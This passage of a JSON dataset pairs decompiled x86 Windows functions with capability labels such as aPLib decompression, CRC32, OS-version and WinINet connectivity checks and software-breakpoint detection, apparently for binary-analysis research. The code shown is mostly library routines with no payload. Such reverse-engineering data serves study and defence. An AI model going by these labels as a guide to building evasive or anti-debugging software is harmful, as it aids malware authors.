= unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x18) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x18)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x00419a1a;\n        }\n    }\n    var_4ch = *(unaff_EBP + 0x20);\n    iVar6 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    *(unaff_EBP + -0x48) = iVar6;\n    if (iVar6 == 0) goto code_r0x00419a1a;\n    *(unaff_EBP + -4) = 0;\n    fcn.0040fc80();\n    *(unaff_EBP + -0x18) = &fcn.004196a7::var_4ch;\n    *(unaff_EBP + -0x34) = &fcn.004196a7::var_4ch;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x34) == 0) {\n        iVar2 = fcn.0040b8de();\n        *(unaff_EBP + -0x34) = iVar2;\n        if (iVar2 == 0) goto code_r0x00419a1a;\n        *(unaff_EBP + -0x3c) = 1;\n    }\n    unique0x00007a00 = *(unaff_EBP + 0x14);\n    _auStack48 = *(unaff_EBP + 0x10);\n    var_30h_2 = 1;\n    lpString1 = *(unaff_EBP + 0x20);\n    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar2 != 0) {\n        arg_8h_00 = &fcn.004196a7::lpString1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 0x20), 9, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), 0, 0);\n        *(unaff_EBP + -0x4c) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -4) = 1;\n            fcn.0040fc80();\n            *(unaff_EBP + -0x18) = &fcn.004196a7::lpString1;\n            *(unaff_EBP + -0x50) = &fcn.004196a7::lpString1;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x38) {\n                arg_8h_00 = fcn.0040b8de(iVar2 * 2);\n                if (arg_8h_00 == NULL) goto code_r0x00419955;\n                *(unaff_EBP + -0x44) = 1;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x20), 1, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), arg_8h_00, iVar2);\n            if (iVar5 != 0) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_CompareStringW)\n                                  (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x34), iVar6, arg_8h_00, iVar2);\n                *(unaff_EBP + -0x40) = uVar7;\n            }\n            if (*(unaff_EBP + -0x44) != 0) {\n                fcn.0040cfb5(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00419955:\n    if (*(unaff_EBP + -0x3c) != 0) {\n        fcn.0040cfb5(*(unaff_EBP + -0x34));\n    }\ncode_r0x00419a1a:\n    *(unaff_EBP + -0x60) = 0x419a25;\n    fcn.0040d590();\n    *(unaff_EBP + -0x60) = 0x419a2a;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 2881
    },
    "004011ef": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004011ef(int32_t param_1)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uStack64;\n    uint uStack60;\n    \n    fcn.004011ea();\n    uStack60 = 0;\n    uStack64 = 0x408234;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack64 = 0x7f02;\n    (*_sym.imp.USER32.dll_LoadCursorA)(0);\n    (*_sym.imp.GDI32.dll_GetStockObject)(1);\n    iVar2 = (*_sym.imp.USER32.dll_RegisterClassExA)(&stack0xffffffc0);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x10);\n    iVar4 = (*pcVar1)(0x11);\n    iVar3 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0x88, *(param_1 + 0x18), \"Banner\", 0x80000000, iVar3 - *(param_1 + 0xc) >> 1, \n                       iVar4 - *(param_1 + 0x10) >> 1, *(param_1 + 0xc), *(param_1 + 0x10), 0, 0, 0, param_1);\n    *(param_1 + 4) = iVar3;\n    if (iVar3 != 0) {\n        fcn.00401037();\n        (*_sym.imp.USER32.dll_ShowWindow)(*(param_1 + 4), 5);\n        (*_sym.imp.USER32.dll_UpdateWindow)(*(param_1 + 4));\n    }\n    return *(param_1 + 4);\n}\n",
        "token_count": 422
    },
    "00411832": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411832(uint8_t **arg_8h, int32_t *arg_ch)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint8_t *in_EAX;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint8_t *in_ECX;\n    uint32_t uVar6;\n    int32_t *unaff_ESI;\n    uint var_4h;\n    \n    bVar1 = false;\n    *unaff_ESI = 0;\n    *arg_ch = 1;\n    if (arg_8h != NULL) {\n        *arg_8h = in_ECX;\n        arg_8h = arg_8h + 1;\n    }\n    do {\n        if (*in_EAX == 0x22) {\n            bVar1 = !bVar1;\n            puVar3 = in_EAX + 1;\n            uVar5 = 0x22;\n        }\n        else {\n            *unaff_ESI = *unaff_ESI + 1;\n            if (in_ECX != NULL) {\n                *in_ECX = *in_EAX;\n                in_ECX = in_ECX + 1;\n            }\n            uVar5 = *in_EAX;\n            puVar3 = in_EAX + 1;\n            if ((*(uVar5 + 0x442e21) & 4) != 0) {\n                *unaff_ESI = *unaff_ESI + 1;\n                if (in_ECX != NULL) {\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                puVar3 = in_EAX + 2;\n            }\n            if (uVar5 == 0) {\n                puVar3 = puVar3 + -1;\n                goto code_r0x004118ab;\n            }\n        }\n        in_EAX = puVar3;\n    } while ((bVar1) || ((uVar5 != 0x20 && (uVar5 != 9))));\n    if (in_ECX != NULL) {\n        in_ECX[-1] = 0;\n    }\ncode_r0x004118ab:\n    bVar1 = false;\n    while (*puVar3 != 0) {\n        for (; (*puVar3 == 0x20 || (*puVar3 == 9)); puVar3 = puVar3 + 1) {\n        }\n        if (*puVar3 == 0) break;\n        if (arg_8h != NULL) {\n            *arg_8h = in_ECX;\n            arg_8h = arg_8h + 1;\n        }\n        *arg_ch = *arg_ch + 1;\n        while( true ) {\n            bVar2 = true;\n            uVar6 = 0;\n            for (; *puVar3 == 0x5c; puVar3 = puVar3 + 1) {\n                uVar6 = uVar6 + 1;\n            }\n            if (*puVar3 == 0x22) {\n                puVar4 = puVar3;\n                if ((uVar6 & 1) == 0) {\n                    if ((!bVar1) || (puVar4 = puVar3 + 1,  *puVar4 != 0x22)) {\n                        bVar2 = false;\n                        puVar4 = puVar3;\n                    }\n                    bVar1 = !bVar1;\n                }\n                uVar6 = uVar6 >> 1;\n                puVar3 = puVar4;\n            }\n            for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                if (in_ECX != NULL) {\n                    *in_ECX = 0x5c;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            uVar5 = *puVar3;\n            if ((uVar5 == 0) || ((!bVar1 && ((uVar5 == 0x20 || (uVar5 == 9)))))) break;\n            if (bVar2) {\n                if (in_ECX == NULL) {\n                    if ((*(uVar5 + 0x442e21) & 4) != 0) {\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                }\n                else {\n                    if ((*(uVar5 + 0x442e21) & 4) != 0) {\n                        *in_ECX = uVar5;\n                        in_ECX = in_ECX + 1;\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            puVar3 = puVar3 + 1;\n        }\n        if (in_ECX != NULL) {\n            *in_ECX = 0;\n            in_ECX = in_ECX + 1;\n        }\n        *unaff_ESI = *unaff_ESI + 1;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = NULL;\n    }\n    *arg_ch = *arg_ch + 1;\n    return;\n}\n",
        "token_count": 1211
    },
    "0040874d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040874d(code **param_1)\n\n{\n    code *pcVar1;\n    \n    *param_1 = vtable.std::ios_base.0;\n    if ((param_1[1] == NULL) ||\n       (pcVar1 = param_1[1] + 0x442704,  *pcVar1 = *pcVar1 + -1,  param_1[1][0x442704] < '\\x01')) {\n        fcn.004086ab();\n        pcVar1 = param_1[9];\n        if (pcVar1 != NULL) {\n            fcn.00408575();\n            fcn.0040b0dd(pcVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "0040c1a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c1a3(code **param_1)\n\n{\n    *param_1 = vtable.exception.0;\n    if (param_1[2] != NULL) {\n        fcn.0040cfb5(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00409574": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00409574(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    *(param_1 + 0x54) = param_3 == 1;\n    *(param_1 + 0x4c) = 0;\n    fcn.00409419();\n    if (param_2 != 0) {\n        fcn.00408fa9(param_2 + 8, param_2, param_2 + 4, param_2 + 8, param_2, param_2 + 4);\n    }\n    *(param_1 + 0x58) = param_2;\n    *(param_1 + 0x50) = *0x44272c;\n    uVar1 = *0x44272c;\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x40) = uVar1;\n    return;\n}\n",
        "token_count": 223
    },
    "00409c82": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.00409c82(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040c020();\n    iVar1 = extraout_ECX[0xf];\n    *(unaff_EBP + -0x10) = *0x441350;\n    if ((iVar1 != 0) && (*(extraout_ECX + 0x13) != '\\0')) {\n        (**(*extraout_ECX + 4))(0xffffffff);\n        fcn.00409c5c(8, 0);\n        *(unaff_EBP + -4) = 0;\n        do {\n            iVar1 = *(unaff_EBP + -0x28);\n            if (*(unaff_EBP + -0x14) < 0x10) {\n                iVar1 = unaff_EBP + -0x28;\n            }\n            iVar1 = (**(*extraout_ECX[0xf] + 0x18))\n                              (extraout_ECX + 0x14, iVar1, iVar1 + *(unaff_EBP + -0x18), unaff_EBP + -0x30);\n            if (iVar1 == 0) {\n                *(extraout_ECX + 0x13) = 0;\n            }\n            else if (iVar1 != 1) goto code_r0x00409d4b;\n            iVar1 = *(unaff_EBP + -0x28);\n            if (*(unaff_EBP + -0x14) < 0x10) {\n                iVar1 = unaff_EBP + -0x28;\n            }\n            iVar1 = *(unaff_EBP + -0x30) - iVar1;\n            if (iVar1 != 0) {\n                iVar2 = *(unaff_EBP + -0x28);\n                if (*(unaff_EBP + -0x14) < 0x10) {\n                    iVar2 = unaff_EBP + -0x28;\n                }\n                iVar2 = fcn.0040d513(iVar2, iVar1, 1, extraout_ECX[0x16]);\n                if (iVar1 != iVar2) goto code_r0x00409d4b;\n            }\n            if (*(extraout_ECX + 0x13) == '\\0') goto code_r0x00409d4b;\n            fcn.00409a4b(8, 0);\n        } while( true );\n    }\ncode_r0x00409d5e:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0040d590();\n    return;\ncode_r0x00409d4b:\n    fcn.00401168(1, 0);\n    goto code_r0x00409d5e;\n}\n",
        "token_count": 734
    },
    "0040a14f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040a14f(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040c020();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    *(unaff_EBP + -4) = 0;\n    if (*(extraout_ECX + 0x15) != '\\0') {\n        fcn.0040a102();\n    }\n    if (extraout_ECX[0x12] != NULL) {\n        fcn.0040976f(1);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00409229();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 240
    },
    "0040a39b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a39b(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (*0x44283c == NULL) {\n        fcn.0040ad60(fcn.0040a358);\n    }\n    piVar1 = fcn.00408bd1(8);\n    if (piVar1 == NULL) {\n        piVar1 = NULL;\n    }\n    else {\n        *piVar1 = *0x44283c;\n        piVar1[1] = param_1;\n    }\n    *0x44283c = piVar1;\n    return;\n}\n",
        "token_count": 140
    },
    "0040a974": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040a974(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint noname_3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    piVar2 = arg_ch;\n    if (arg_ch == NULL) {\n        iVar3 = fcn.0040ef04();\n        var_ch = *(iVar3 + 8);\n        iVar3 = fcn.0040eed2();\n    }\n    else {\n        var_ch = *arg_ch;\n        iVar3 = arg_ch[1];\n    }\n    if (var_ch != 0) {\n        if (arg_8h < 0x100) {\n            if (piVar2 == NULL) {\n                iVar4 = fcn.0040ea41(arg_8h);\n                if (iVar4 == 0) {\n                    return arg_8h;\n                }\n            }\n            else if ((*(piVar2[2] + arg_8h * 2) & 1) == 0) {\n                return arg_8h;\n            }\n        }\n        iVar4 = fcn.0040e9fc();\n        uVar1 = arg_8h >> 8 & 0xff;\n        if ((*(iVar4 + 1 + uVar1 * 2) & 0x80) == 0) {\n            arg_ch = arg_ch & 0xffff0000 | arg_8h & 0xff;\n            noname_3 = 1;\n        }\n        else {\n            arg_ch._0_2_ = CONCAT11(arg_8h, uVar1);\n            arg_ch = arg_ch & 0xff000000 | arg_ch;\n            noname_3 = 2;\n        }\n        iVar3 = fcn.0040e63a(var_ch, 0x100, &arg_ch, noname_3, &var_4h, 3, iVar3, 1, unaff_EDI, unaff_EBX, unaff_ESI, \n                             iVar3, var_ch, arg_8h >> 8, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, \n                             in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                             in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028);\n        if (iVar3 != 0) {\n            if (iVar3 == 1) {\n                arg_8h = var_4h & 0xff;\n            }\n            else {\n                arg_8h = CONCAT11(var_4h, var_4h._1_1_);\n            }\n        }\n        return arg_8h;\n    }\n    if (arg_8h < 0x41) {\n        return arg_8h;\n    }\n    if (0x5a < arg_8h) {\n        return arg_8h;\n    }\n    return arg_8h + 0x20;\n}\n",
        "token_count": 901
    },
    "0040ab0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040ab0b(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0040db1e();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0040efbb(0xc);\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0040abb7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040abb7(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0040db1e();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0040efbb(0xc);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0040abd4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040abd4(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t noname_6;\n    int32_t iVar4;\n    uint noname_3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    bool bVar5;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    piVar2 = arg_ch;\n    if (arg_ch == NULL) {\n        iVar3 = fcn.0040ef04();\n        iVar3 = *(iVar3 + 8);\n        noname_6 = fcn.0040eed2();\n    }\n    else {\n        iVar3 = *arg_ch;\n        noname_6 = arg_ch[1];\n    }\n    if (iVar3 == 0) {\n        if ((0x60 < arg_8h) && (arg_8h < 0x7b)) {\n            arg_8h = arg_8h - 0x20;\n        }\n    }\n    else {\n        if (arg_8h < 0x100) {\n            if (piVar2 == NULL) {\n                iVar4 = fcn.0040ea7b(arg_8h);\n                bVar5 = iVar4 == 0;\n            }\n            else {\n                bVar5 = (*(piVar2[2] + arg_8h * 2) & 2) == 0;\n            }\n            if (bVar5) {\n                return arg_8h;\n            }\n        }\n        iVar4 = fcn.0040e9fc();\n        uVar1 = arg_8h >> 8 & 0xff;\n        if ((*(iVar4 + 1 + uVar1 * 2) & 0x80) == 0) {\n            arg_ch = arg_ch & 0xffff0000 | arg_8h & 0xff;\n            noname_3 = 1;\n        }\n        else {\n            arg_ch._0_2_ = CONCAT11(arg_8h, uVar1);\n            arg_ch = arg_ch & 0xff000000 | arg_ch;\n            noname_3 = 2;\n        }\n        iVar3 = fcn.0040e63a(iVar3, 0x200, &arg_ch, noname_3, &var_4h, 3, noname_6, 1, unaff_EBX, unaff_EDI, unaff_ESI, \n                             noname_6, arg_8h >> 8, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c\n                             , in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c);\n        if (iVar3 != 0) {\n            if (iVar3 == 1) {\n                arg_8h = var_4h & 0xff;\n            }\n            else {\n                arg_8h = CONCAT11(var_4h, var_4h._1_1_);\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 912
    },
    "0040ad43": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040ad43(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0040db1e();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0040efbb(0xc);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0040cfb5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040cfb5(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    int32_t arg_ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43b030, 0xc);\n    arg_ch = *(unaff_EBP + 8);\n    if (arg_ch != 0) {\n        if (*0x4431fc == 3) {\n            fcn.0040f088(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.0040fe0a(arg_ch);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.0040fe35(arg_8h_00, arg_ch);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0040d008();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0040d020;\n            arg_ch = *(unaff_EBP + 8);\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4431ec, 0, arg_ch);\n    }\ncode_r0x0040d020:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 350
    },
    "0040b204": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040b204(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint arg_8h, uint arg_ch, uint noname_16, uint noname_17, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc4;\n    if (var_8h_3 == 0x123) {\n        